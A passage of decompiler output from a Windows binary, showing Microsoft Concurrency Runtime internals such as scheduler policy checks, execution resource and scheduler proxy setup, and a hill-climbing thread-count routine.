//----- (004546FD) --------------------------------------------------------
_DWORD *__cdecl sub_4546FD(_DWORD *a1, unsigned int a2, char a3)
{
  char *v4; // [esp+0h] [ebp-4h] BYREF

  v4 = &a3;
  sub_45480C(a1, a2, (int *)&v4);
  return a1;
}

//----- (0045471B) --------------------------------------------------------
_DWORD *__thiscall sub_45471B(_DWORD *this, const void **a2)
{
  void *v3; // edi
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  *this = v3;
  result = this;
  qmemcpy(v3, *a2, 0x28u);
  return result;
}

//----- (00454742) --------------------------------------------------------
char *__thiscall sub_454742(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_key::`vftable';
  return this;
}
// 493BEC: using guessed type void *Concurrency::invalid_scheduler_policy_key::`vftable';

//----- (0045475D) --------------------------------------------------------
char *__thiscall sub_45475D(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_thread_specification::`vftable';
  return this;
}
// 493C04: using guessed type void *Concurrency::invalid_scheduler_policy_thread_specification::`vftable';

//----- (00454778) --------------------------------------------------------
char *__thiscall sub_454778(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_value::`vftable';
  return this;
}
// 493BF8: using guessed type void *Concurrency::invalid_scheduler_policy_value::`vftable';

//----- (00454793) --------------------------------------------------------
void __thiscall sub_454793(void **this)
{
  sub_44775B(*this);
}

//----- (0045479F) --------------------------------------------------------
void **__thiscall sub_45479F(void **this, const void **a2)
{
  void **result; // eax

  result = this;
  qmemcpy(*this, *a2, 0x28u);
  return result;
}

//----- (004547B8) --------------------------------------------------------
int __thiscall sub_4547B8(_DWORD *this, unsigned int a2)
{
  char *v3; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( a2 > 9 )
  {
    v3 = sub_45493D(a2);
    sub_4529A6(pExceptionObject, (int)v3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__);
  }
  return *(_DWORD *)(*this + 4 * a2);
}

//----- (004547EE) --------------------------------------------------------
bool __cdecl sub_4547EE(unsigned int a1, unsigned int a2)
{
  return a2 == -1 || a1 == -1 || a2 >= a1;
}

//----- (0045480C) --------------------------------------------------------
_DWORD *__thiscall sub_45480C(_DWORD *this, unsigned int a2, int *a3)
{
  void *v4; // eax
  unsigned int v5; // ebx
  _DWORD *v6; // edi
  unsigned int v7; // esi
  int v8; // eax
  int v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v13; // eax
  _ThrowInfo *v14; // [esp-4h] [ebp-54h]
  char v15[12]; // [esp+10h] [ebp-40h] BYREF
  char pExceptionObject[12]; // [esp+1Ch] [ebp-34h] BYREF
  char v17[12]; // [esp+28h] [ebp-28h] BYREF
  void *v18; // [esp+34h] [ebp-1Ch]
  int v19; // [esp+38h] [ebp-18h]
  void *Block; // [esp+3Ch] [ebp-14h]
  int v21; // [esp+4Ch] [ebp-4h]

  v18 = this;
  v4 = operator new(0x28u);
  *this = v4;
  Block = v4;
  v5 = 0;
  qmemcpy(v4, &unk_493CCC, 0x28u);
  v21 = 0;
  v6 = v4;
  while ( v5 < a2 )
  {
    *a3 += 4;
    v7 = *(_DWORD *)(*a3 - 4);
    v8 = *a3 + 4;
    *a3 = v8;
    v9 = *(_DWORD *)(v8 - 4);
    v19 = v9;
    if ( v7 > 9 )
    {
      v10 = sub_45493D(v7);
      sub_4529A6(pExceptionObject, (int)v10);
      v14 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__;
      v11 = pExceptionObject;
      goto LABEL_11;
    }
    if ( !sub_454954(v7, v9) )
    {
      v13 = sub_45493D(v7);
      sub_4529D2(v17, (int)v13);
      v14 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__;
      v11 = v17;
LABEL_11:
      _CxxThrowException(v11, v14);
    }
    ++v5;
    v6[v7] = v19;
  }
  if ( !sub_4547EE(*(_DWORD *)(*(_DWORD *)v18 + 8), *(_DWORD *)(*(_DWORD *)v18 + 4)) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)v15);
    v14 = (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__;
    v11 = v15;
    goto LABEL_11;
  }
  return sub_4548F5(v18);
}
// 4F57A4: using guessed type __TI_flags _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__;

//----- (004548F5) --------------------------------------------------------
_DWORD *__thiscall sub_4548F5(void *this)
{
  unsigned int v2; // edx
  _DWORD *result; // eax
  unsigned int v4; // esi
  unsigned int v5; // ecx

  **(_DWORD **)this = 0;
  v2 = sub_44CE93();
  result = *(_DWORD **)this;
  v4 = *(_DWORD *)(*(_DWORD *)this + 8);
  if ( v4 == -1 )
  {
    v5 = result[1];
    if ( v5 == -1 )
    {
      result[1] = v2;
      result = *(_DWORD **)this;
      *(_DWORD *)(*(_DWORD *)this + 8) = v2;
    }
    else
    {
      if ( v5 >= v2 )
        v5 = v2;
      result[2] = v5;
    }
  }
  else if ( result[1] == -1 )
  {
    if ( v4 <= v2 )
      v4 = v2;
    result[1] = v4;
  }
  return result;
}

//----- (0045493D) --------------------------------------------------------
char *__cdecl sub_45493D(unsigned int a1)
{
  int v1; // eax

  v1 = a1;
  if ( a1 > 0xA )
    v1 = 10;
  return off_493CF4[v1];
}
// 493CF4: using guessed type char *off_493CF4[11];

//----- (00454954) --------------------------------------------------------
bool __cdecl sub_454954(int a1, int a2)
{
  char v2; // cl
  bool v3; // zf

  v2 = 1;
  switch ( a1 )
  {
    case 0:
      return a2 == 0;
    case 1:
      if ( a2 > 0 )
        return v2;
      v3 = a2 == -1;
      break;
    case 2:
      if ( (unsigned int)a2 <= 0x7FFFFFFF )
        return v2;
      v3 = a2 == -1;
      break;
    case 3:
      if ( a2 <= 0 )
        return 0;
      return v2;
    case 4:
    case 5:
      return (unsigned int)a2 <= 0x7FFFFFFF;
    case 6:
      if ( a2 >= -7 && a2 < 7 || a2 == 15 || a2 == -15 )
        return v2;
      v3 = a2 == 61440;
      break;
    case 7:
      if ( !a2 )
        return v2;
      v3 = a2 == 1;
      break;
    case 8:
      if ( a2 == 1 )
        return v2;
      v3 = a2 == 0;
      break;
    case 9:
      if ( a2 )
        return a2 == 1;
      return v2;
    default:
      terminate(1);
  }
  if ( !v3 )
    return 0;
  return v2;
}
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00454A34) --------------------------------------------------------
int __thiscall sub_454A34(int *this)
{
  int result; // eax
  char *v2; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = *this;
  if ( !*(_DWORD *)(*this + 8) )
  {
    v2 = sub_45493D(2u);
LABEL_6:
    sub_4529D2(pExceptionObject, (int)v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__);
  }
  if ( !*(_DWORD *)(result + 32) )
  {
    v2 = sub_45493D(8u);
    goto LABEL_6;
  }
  return result;
}

//----- (00454A6E) --------------------------------------------------------
_DWORD *__thiscall sub_454A6E(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  *this = &Concurrency::details::ExecutionResource::`vftable';
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  *((_WORD *)this + 6) = 0;
  this[2] = 0;
  this[5] = a2;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = a3[4];
  this[12] = 0;
  this[10] = a4;
  result = this;
  this[11] = (a3[3] << 8) + *(unsigned __int8 *)(a3[12] + 52 * a4 + 8);
  return result;
}
// 493E04: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (00454ACC) --------------------------------------------------------
_DWORD *__thiscall sub_454ACC(_DWORD *this, int a2, _DWORD *a3)
{
  *this = &Concurrency::details::ExecutionResource::`vftable';
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  *((_WORD *)this + 6) = 0;
  this[2] = 0;
  this[5] = a2;
  this[7] = 0;
  this[8] = 0;
  this[6] = a3;
  this[9] = a3[9];
  this[10] = a3[10];
  this[12] = 0;
  this[11] = a3[11];
  return this;
}
// 493E04: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (00454B1A) --------------------------------------------------------
int __thiscall sub_454B1A(_DWORD *this)
{
  return sub_44B8B3(*(_DWORD *)(this[5] + 12), this[9], this[10]);
}

//----- (00454B2C) --------------------------------------------------------
void __thiscall sub_454B2C(DWORD_PTR *Block)
{
  DWORD_PTR v3; // edi
  void *v4; // ecx
  HANDLE CurrentThread; // eax

  if ( Block[12]-- == 1 )
  {
    v3 = Block[7];
    sub_454CC3((int)Block);
    v4 = (void *)Block[6];
    if ( v4 )
    {
      sub_454B2C(v4);
      sub_4562C8((_DWORD *)Block[5], Block);
    }
    else
    {
      sub_455A92((_DWORD *)Block[5], Block[9], Block[10], v3 == 0);
      if ( !v3 )
      {
        CurrentThread = GetCurrentThread();
        sub_44B371(Block + 2, CurrentThread);
        sub_455A48((_DWORD *)Block[5], (int)Block);
        sub_455B26(Block[5], Block);
      }
    }
  }
}

//----- (00454B94) --------------------------------------------------------
int __thiscall sub_454B94(_DWORD *this)
{
  return this[11];
}

//----- (00454B98) --------------------------------------------------------
int __thiscall sub_454B98(_DWORD *this)
{
  return this[9];
}

//----- (00454B9C) --------------------------------------------------------
int __thiscall sub_454B9C(_DWORD *lpTlsValue)
{
  _DWORD *v1; // esi
  int v2; // ecx
  int result; // eax
  _DWORD *v4; // ecx
  int v5; // edi
  HANDLE CurrentThread; // ebx
  _DWORD *v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned __int16 v10; // cx
  int v11; // esi
  int v13[3]; // [esp+8h] [ebp-1Ch] BYREF
  int v14[3]; // [esp+14h] [ebp-10h] BYREF

  v1 = lpTlsValue;
  v2 = lpTlsValue[12];
  result = v2 + 1;
  lpTlsValue[12] = v2 + 1;
  if ( !v2 )
  {
    v4 = (_DWORD *)v1[5];
    v5 = v1[7];
    if ( v1[6] )
    {
      sub_4556B9(v4, (int)v1);
    }
    else
    {
      sub_456079(v4, v1[9], v1[10], v5 == 0);
      if ( !v5 )
      {
        CurrentThread = GetCurrentThread();
        v7 = sub_44AEE5(v13, (int)CurrentThread);
        v8 = 52 * v1[9];
        *((_WORD *)v1 + 6) = *((_WORD *)v7 + 2);
        v1[2] = *v7;
        v9 = *(_DWORD *)(v1[5] + 16);
        v10 = *(_WORD *)(v9 + v8 + 12);
        v11 = *(_DWORD *)(v9 + v8);
        v14[2] = 0;
        v14[1] = v10;
        v14[0] = v11;
        sub_44B371((DWORD_PTR *)v14, CurrentThread);
        v1 = lpTlsValue;
        sub_45602B((_DWORD *)lpTlsValue[5], (int)lpTlsValue);
        sub_455632(v1[5], (int)v1);
      }
    }
    return sub_454CDF(v1);
  }
  return result;
}
// 454B9C: using guessed type int var_1C[3];

//----- (00454C64) --------------------------------------------------------
void __thiscall sub_454C64(DWORD_PTR *this, int a2)
{
  _DWORD *v3; // ecx
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pScheduler");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( sub_455C6B((_DWORD *)this[5]) != this || (v3 = (_DWORD *)this[5], v3[2] != a2) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_44E284(v3[3], this);
}

//----- (00454CC3) --------------------------------------------------------
BOOL __thiscall sub_454CC3(int this)
{
  BOOL result; // eax

  result = sub_44AAD1(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 20) + 12) + 112), *(LPVOID *)(this + 32));
  *(_DWORD *)(this + 32) = 0;
  return result;
}

//----- (00454CDF) --------------------------------------------------------
BOOL __thiscall sub_454CDF(_DWORD *lpTlsValue)
{
  DWORD v2; // esi

  v2 = *(_DWORD *)(*(_DWORD *)(lpTlsValue[5] + 12) + 112);
  lpTlsValue[8] = sub_44AAC3(v2);
  return sub_44AAD1(v2, lpTlsValue);
}

//----- (00454D02) --------------------------------------------------------
double __cdecl sub_454D02(double a1)
{
  if ( 0.0 == a1 )
    return 0.0;
  if ( a1 <= 0.0 )
    return (double)-1;
  else
    return (double)1;
}

//----- (00454D3A) --------------------------------------------------------
int __thiscall sub_454D3A(int this, int a2, unsigned int a3, int a4)
{
  int v4; // eax
  int v5; // edx
  int result; // eax

  v4 = this + 8;
  v5 = 64;
  do
  {
    *(double *)(v4 - 8) = 0.0;
    *(double *)v4 = 0.0;
    *(_DWORD *)(v4 + 8) = 0;
    *(_DWORD *)(v4 + 12) = 0;
    *(_DWORD *)(v4 + 16) = 0;
    v4 += 32;
    --v5;
  }
  while ( v5 );
  *(_DWORD *)(this + 2048) = a4;
  *(_DWORD *)(this + 2076) = a2;
  *(_DWORD *)(this + 2068) = 0;
  *(_DWORD *)(this + 2072) = 0;
  *(_DWORD *)(this + 2080) = 0;
  *(_DWORD *)(this + 2084) = 0;
  *(_DWORD *)(this + 2088) = 0;
  *(_DWORD *)(this + 2092) = 0;
  *(_DWORD *)(this + 2096) = 0;
  *(_BYTE *)(this + 2100) = 1;
  *(_DWORD *)(this + 2064) = a3;
  result = this;
  *(double *)(this + 2056) = (double)a3;
  return result;
}

//----- (00454DC7) --------------------------------------------------------
int __thiscall sub_454DC7(double *this, double a2, int a3)
{
  int result; // eax
  double v4; // st7

  result = a3;
  v4 = *this + a2;
  ++*((_DWORD *)this + 4);
  *((_DWORD *)this + 6) = a3;
  *this = v4;
  this[1] = a2 * a2 + this[1];
  return result;
}

//----- (00454DEA) --------------------------------------------------------
double __stdcall sub_454DEA(unsigned int a1, unsigned int a2, int a3, int a4)
{
  return (double)a2 * 10.0 / (double)a1;
}

//----- (00454E25) --------------------------------------------------------
double __thiscall sub_454E25(char *this, int a2, int a3)
{
  char *v4; // ebx
  char *v5; // esi
  long double v6; // st6
  long double v7; // st7
  double v9; // [esp+14h] [ebp-18h]
  double v10; // [esp+1Ch] [ebp-10h]

  v4 = sub_454FA2(this, a2);
  v5 = sub_454FA2(this, a3);
  v10 = sub_455016((double *)v4);
  v6 = sub_455016((double *)v5) - v10;
  v9 = sub_455268((double *)v4) / (double)*((int *)v4 + 4);
  v7 = 0.0;
  if ( fabs(v6) > 0.0 )
    v7 = fabs(sqrt(sub_455268((double *)v5) / (double)*((int *)v5 + 4) + v9) / v6);
  return exp(v7 * -1.0) * (v6 / v10 / ((double)(a3 - a2) / (double)a2) - 0.15);
}

//----- (00454EE0) --------------------------------------------------------
double __thiscall sub_454EE0(int this)
{
  long double v3; // [esp+Ch] [ebp-8h]

  v3 = sqrt(sub_455268((double *)this)) / sqrt((double)*(int *)(this + 16));
  return v3 / sub_455016((double *)this);
}

//----- (00454F17) --------------------------------------------------------
unsigned int __thiscall sub_454F17(int this, int a2)
{
  unsigned int result; // eax
  int v4; // ecx
  char *v5; // eax

  result = a2;
  v4 = *(_DWORD *)(this + 2068);
  if ( a2 != v4 )
  {
    *(_DWORD *)(this + 2072) = v4;
    *(_DWORD *)(this + 2068) = a2;
    v5 = sub_454FA2((char *)this, a2);
    *(double *)v5 = 0.0;
    *((_DWORD *)v5 + 4) = 0;
    *((_DWORD *)v5 + 5) = 0;
    *((_DWORD *)v5 + 6) = 0;
    *((double *)v5 + 1) = 0.0;
    return sub_454F5C((unsigned int *)this);
  }
  return result;
}

//----- (00454F5C) --------------------------------------------------------
unsigned int __thiscall sub_454F5C(unsigned int *this)
{
  unsigned int *v1; // edx
  int v2; // esi
  unsigned int result; // eax

  v1 = this + 5;
  v2 = 64;
  do
  {
    result = *v1;
    if ( *v1 != this[517] && result != this[518] )
    {
      result = this[521] - v1[1];
      if ( result > 0x32 )
      {
        *(v1 - 1) = 0;
        *v1 = 0;
        v1[1] = 0;
        *(double *)(v1 - 5) = 0.0;
        *(double *)(v1 - 3) = 0.0;
      }
    }
    v1 += 8;
    --v2;
  }
  while ( v2 );
  return result;
}

//----- (00454FA2) --------------------------------------------------------
char *__thiscall sub_454FA2(char *this, int a2)
{
  char *result; // eax

  result = &this[32 * (a2 & 0x3F)];
  if ( *((_DWORD *)result + 5) != a2 )
  {
    *((_DWORD *)result + 4) = 0;
    *((_DWORD *)result + 6) = 0;
    *(double *)result = 0.0;
    *((double *)result + 1) = 0.0;
    *((_DWORD *)result + 5) = a2;
  }
  return result;
}

//----- (00454FCD) --------------------------------------------------------
BOOL __thiscall sub_454FCD(_BYTE *this)
{
  char v1; // dl

  v1 = this[2100];
  this[2100] = v1 == 0;
  return v1 != 0;
}

//----- (00454FE6) --------------------------------------------------------
bool __stdcall sub_454FE6(int a1)
{
  return *(_DWORD *)(a1 + 16) > 5u || *(_DWORD *)(a1 + 16) >= 3u && fabs(sub_454EE0(a1)) <= 0.004;
}

//----- (00455016) --------------------------------------------------------
double __thiscall sub_455016(double *this)
{
  int v2; // [esp+4h] [ebp-4h]

  v2 = *((_DWORD *)this + 4);
  if ( v2 )
    return *this / (double)v2;
  else
    return 0.0;
}

//----- (00455036) --------------------------------------------------------
unsigned int __thiscall sub_455036(_DWORD *this, unsigned int a2)
{
  _DWORD *v3; // esi
  unsigned int v4; // ebx
  unsigned int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int result; // eax

  v3 = (_DWORD *)this[512];
  v4 = v3[46] + sub_44D60B(v3);
  v5 = sub_44B917(v3);
  v6 = this[517];
  v7 = v5;
  v8 = this[516];
  result = a2;
  if ( v8 + v6 < a2 )
    result = v8 + v6;
  if ( v6 > v8 && v6 - v8 > result )
    result = v6 - v8;
  if ( result == v6 )
  {
    if ( result <= v4 )
      ++result;
    else
      --result;
  }
  if ( v4 > result )
    result = v4;
  if ( v7 < result )
    return v7;
  return result;
}

//----- (004550A8) --------------------------------------------------------
unsigned int __thiscall sub_4550A8(int this, unsigned int a2, unsigned int a3, int a4, unsigned int a5)
{
  unsigned int result; // eax
  int v7; // edi
  unsigned int v8; // ecx
  int v9; // edx
  unsigned int v10; // eax
  int v11; // esi
  _DWORD *v12; // esi
  unsigned int v13; // edi
  unsigned int v14; // eax
  unsigned int v15; // esi
  int v16; // edi
  double *v17; // esi
  double v18; // st7
  unsigned __int64 v19; // rax
  double v20; // [esp+18h] [ebp-Ch]
  double v21; // [esp+18h] [ebp-Ch]
  char *v22; // [esp+20h] [ebp-4h]

  if ( !a2 )
    return 0;
  ++*(_DWORD *)(this + 2084);
  sub_454F17(this, a2);
  v7 = *(_DWORD *)(this + 2088);
  v8 = a3;
  v9 = a4;
  if ( v7 )
  {
    v8 = *(_DWORD *)(this + 2092) + a3;
    v9 = *(_DWORD *)(this + 2096) + a4;
  }
  if ( v8 < a2 && v8 < a5 )
  {
    v10 = a2 - v8;
    v8 = a2;
    v9 += v10;
  }
  v11 = *(_DWORD *)(this + 2080);
  if ( !v11 || v8 || v9 || a5 )
  {
    v14 = v7 + 1;
    v15 = v11 + 1;
    *(_DWORD *)(this + 2080) = v15;
    *(_DWORD *)(this + 2092) = 0;
    *(_DWORD *)(this + 2096) = 0;
    *(_DWORD *)(this + 2088) = 0;
    v16 = *(_DWORD *)(this + 2068);
    v20 = sub_454DEA(v14, v8, v9, a5);
    if ( v15 <= 1 )
    {
      *(_DWORD *)(this + 2072) = v16;
      return v16;
    }
    v17 = (double *)sub_454FA2((char *)this, v16);
    v22 = sub_454FA2((char *)this, *(_DWORD *)(this + 2072));
    sub_454DC7(v17, v20, *(_DWORD *)(this + 2084));
    if ( !*((_DWORD *)v22 + 4) || v17 == (double *)v22 )
    {
      if ( !sub_454FE6((int)v17) )
        return v16;
      LODWORD(v19) = *(_DWORD *)(this + 2068) + sub_454FCD((_BYTE *)this);
    }
    else
    {
      if ( !sub_454FE6((int)v17) )
        return v16;
      v18 = sub_454E25((char *)this, *(_DWORD *)(this + 2072), *(_DWORD *)(this + 2068)) * *(double *)(this + 2056);
      v21 = (double)*(unsigned int *)(this + 2068);
      v19 = (unsigned __int64)(v21 + v18);
      if ( (_DWORD)v19 == *(_DWORD *)(this + 2068) )
        v19 = (unsigned __int64)(sub_454D02(v18) + v21);
    }
    return sub_455036((_DWORD *)this, v19);
  }
  v12 = *(_DWORD **)(this + 2048);
  v13 = v7 + 1;
  *(_DWORD *)(this + 2092) = 0;
  *(_DWORD *)(this + 2088) = v13;
  *(_DWORD *)(this + 2096) = 0;
  result = v12[46] + sub_44D60B(v12);
  if ( v13 < 3 )
    return *(_DWORD *)(this + 2068);
  return result;
}

//----- (00455268) --------------------------------------------------------
double __thiscall sub_455268(double *this)
{
  int v1; // eax
  double result; // st7
  long double v3; // st6

  v1 = *((_DWORD *)this + 4);
  result = 0.0;
  v3 = 0.0;
  if ( v1 >= 2 )
    v3 = (this[1] - *this * *this / (double)v1) / (double)(v1 - 1);
  if ( fabs(v3) > 0.0001 )
    return v3;
  return result;
}

//----- (004552B4) --------------------------------------------------------
char *__thiscall sub_4552B4(char *this, int a2, int a3, _DWORD *a4)
{
  int v5; // eax
  bool v6; // zf
  HANDLE CurrentThread; // eax
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // esi
  unsigned int v11; // edi
  unsigned int v12; // eax
  unsigned int v13; // edi
  int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // eax
  int v17; // ecx
  int v18; // esi
  unsigned int v19; // ecx
  void *v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  unsigned int v24; // ecx
  unsigned int v26; // [esp+14h] [ebp-18h]

  *((_DWORD *)this + 1) = 0;
  *(_DWORD *)this = &Concurrency::details::SchedulerProxy::`vftable';
  *((_DWORD *)this + 3) = a3;
  sub_449ED8((LPCRITICAL_SECTION)(this + 32));
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 39) = 0;
  *((_DWORD *)this + 40) = 0;
  *((_DWORD *)this + 42) = 0;
  *((_DWORD *)this + 43) = 0;
  *((_DWORD *)this + 44) = 0;
  *((_DWORD *)this + 45) = 0;
  *((_DWORD *)this + 46) = 0;
  *((_DWORD *)this + 49) = 0;
  *((_DWORD *)this + 50) = 0;
  *((_DWORD *)this + 2) = a2;
  *((_DWORD *)this + 35) = sub_4547B8(a4, 1u);
  *((_DWORD *)this + 34) = sub_4547B8(a4, 2u);
  *((_DWORD *)this + 36) = sub_4547B8(a4, 3u);
  *((_DWORD *)this + 37) = sub_4547B8(a4, 5u);
  *((_DWORD *)this + 38) = sub_4547B8(a4, 6u);
  v5 = sub_4547B8(a4, 8u);
  v6 = *((_DWORD *)this + 38) == 61440;
  this[204] = v5 == 1;
  if ( v6 )
  {
    CurrentThread = GetCurrentThread();
    *((_DWORD *)this + 38) = (char)sub_44A94F(CurrentThread);
  }
  *((_DWORD *)this + 31) = (***((int (__thiscall ****)(_DWORD))this + 2))(*((_DWORD *)this + 2));
  v8 = sub_44CC61();
  v9 = *((_DWORD *)this + 35);
  v10 = v8;
  v11 = *((_DWORD *)this + 36);
  v26 = v8;
  *((_DWORD *)this + 47) = v8;
  v12 = (v8 + v9 - 1) / v8;
  if ( v11 >= v12 )
    v10 = (v9 + v11 - 1) / v11;
  else
    *((_DWORD *)this + 36) = v12;
  *((_DWORD *)this + 32) = v10;
  v13 = *((_DWORD *)this + 34);
  v14 = v9 / v10;
  if ( v9 % v10 )
  {
    v16 = (v10 + v9 - 1) / v10;
    *((_DWORD *)this + 36) = v16;
    v17 = v9 + v10 * (1 - v16);
    v18 = v10 - v17;
    *((_DWORD *)this + 41) = v17;
    v19 = v18 * (v16 - 1);
    if ( v19 < v13 )
    {
      *((_DWORD *)this + 33) = v18;
      v15 = v18 + (v13 - v19 + v16 - 1) / v16;
    }
    else
    {
      v15 = (v13 + v16 - 2) / (v16 - 1);
    }
  }
  else
  {
    *((_DWORD *)this + 36) = v14;
    *((_DWORD *)this + 41) = v10;
    v15 = (v13 + v14 - 1) / (v9 / v10);
  }
  *((_DWORD *)this + 33) = v15;
  sub_44E016(*((volatile signed __int32 **)this + 3));
  if ( this[204] )
  {
    v20 = operator new(0x838u);
    if ( v20 )
      v21 = sub_454D3A((int)v20, *((_DWORD *)this + 31), v26, (int)this);
    else
      v21 = 0;
    *((_DWORD *)this + 14) = v21;
  }
  v22 = sub_44CE98();
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 48) = v22;
  v23 = unknown_libname_86((unsigned __int64)(unsigned int)v22 >> 30 != 0 ? -1 : 4 * v22);
  v24 = 0;
  for ( *((_DWORD *)this + 5) = v23; v24 < *((_DWORD *)this + 48); ++v24 )
    *(_DWORD *)(*((_DWORD *)this + 5) + 4 * v24) = v24;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 44CE98: using guessed type int sub_44CE98(void);
// 493E3C: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (0045550A) --------------------------------------------------------
void __thiscall sub_45550A(char *this)
{
  _DWORD *v2; // ecx
  void **v3; // [esp-4h] [ebp-18h]

  v3 = (void **)*((_DWORD *)this + 4);
  v2 = (_DWORD *)*((_DWORD *)this + 3);
  *(_DWORD *)this = &Concurrency::details::SchedulerProxy::`vftable';
  sub_44B930(v2, v3);
  j_j__free(*((void **)this + 5));
  sub_44E064(*((_DWORD *)this + 3));
  sub_449F62((LPCRITICAL_SECTION)(this + 32));
}
// 493E3C: using guessed type void *Concurrency::details::SchedulerProxy::`vftable';

//----- (00455567) --------------------------------------------------------
void __thiscall sub_455567(_DWORD *this, int a2, int a3, char a4)
{
  int v5; // eax
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  char *v8; // esi
  int v9; // eax
  int v10; // ecx
  char v11; // [esp+Ch] [ebp-Ch] BYREF
  int v12; // [esp+10h] [ebp-8h]
  char *v13; // [esp+14h] [ebp-4h]

  v5 = this[41];
  v6 = this[36];
  if ( v5 )
    this[41] = v5 - 1;
  else
    --v6;
  ++*(_DWORD *)(a2 + 28);
  ++this[40];
  v7 = (_DWORD *)(*(_DWORD *)(a2 + 48) + 52 * a3);
  *v7 = 4;
  v7[9] = v6;
  this[44] += v6;
  if ( a4 )
    sub_4563E9(this, a2, a3);
  if ( v6 == 1 )
  {
    v13 = &v11;
    goto LABEL_9;
  }
  v8 = (char *)unknown_libname_86((unsigned __int64)v6 >> 30 != 0 ? -1 : 4 * v6);
  v13 = v8;
  if ( v6 )
  {
LABEL_9:
    v12 = 0;
    do
    {
      v9 = (*(int (__thiscall **)(_DWORD *, int, int))(*this + 24))(this, a2, a3);
      v10 = v12;
      v8 = v13;
      *(_DWORD *)&v13[4 * v12] = v9;
      v12 = v10 + 1;
    }
    while ( v10 + 1 < v6 );
  }
  sub_4556C8((int)this, (int)v8, v6);
  if ( v8 != &v11 )
    j_j__free(v8);
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00455632) --------------------------------------------------------
void __thiscall sub_455632(int this, int a2)
{
  struct _RTL_CRITICAL_SECTION *v2; // esi

  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 32));
  sub_455680(
    (_DWORD *)(*(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + *(_DWORD *)(this + 16) + 48) + 52 * *(_DWORD *)(a2 + 40) + 12),
    a2);
  sub_44A32E(v2);
}

//----- (00455680) --------------------------------------------------------
int __thiscall sub_455680(_DWORD *this, int a2)
{
  int result; // eax

  result = this[1];
  if ( result )
  {
    *(_DWORD *)(a2 + 56) = *(_DWORD *)(result + 56);
    *(_DWORD *)(a2 + 52) = this[1];
    *(_DWORD *)(*(_DWORD *)(this[1] + 56) + 52) = a2;
    result = this[1];
    *(_DWORD *)(result + 56) = a2;
  }
  else
  {
    *(_DWORD *)(a2 + 56) = a2;
    *(_DWORD *)(a2 + 52) = a2;
  }
  ++*this;
  this[1] = a2;
  return result;
}

//----- (004556B9) --------------------------------------------------------
int __thiscall sub_4556B9(_DWORD *this, int a2)
{
  return sub_455680(this + 49, a2);
}

//----- (004556C8) --------------------------------------------------------
void __thiscall sub_4556C8(int this, int a2, unsigned int a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  unsigned int v4; // eax
  int v5; // ebx
  int v6; // eax
  struct _RTL_CRITICAL_SECTION *v7; // [esp+10h] [ebp-18h]
  unsigned int v8; // [esp+14h] [ebp-14h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  v7 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 32));
  v4 = 0;
  v8 = 0;
  if ( a3 )
  {
    do
    {
      v5 = *(_DWORD *)(a2 + 4 * v4);
      v6 = (**(int (__thiscall ***)(int))v5)(v5);
      sub_455680(
        (_DWORD *)(*(_DWORD *)(52 * v6 + *(_DWORD *)(this + 16) + 48) + 12 + 52 * *(_DWORD *)(v5 + 48)),
        v5 + 8);
      v4 = v8 + 1;
      v8 = v4;
    }
    while ( v4 < a3 );
    v3 = v7;
  }
  (*(void (__thiscall **)(_DWORD, int, unsigned int))(**(_DWORD **)(this + 8) + 12))(*(_DWORD *)(this + 8), a2, a3);
  *(_DWORD *)(this + 156) += a3;
  sub_44A32E(v3);
}

//----- (00455776) --------------------------------------------------------
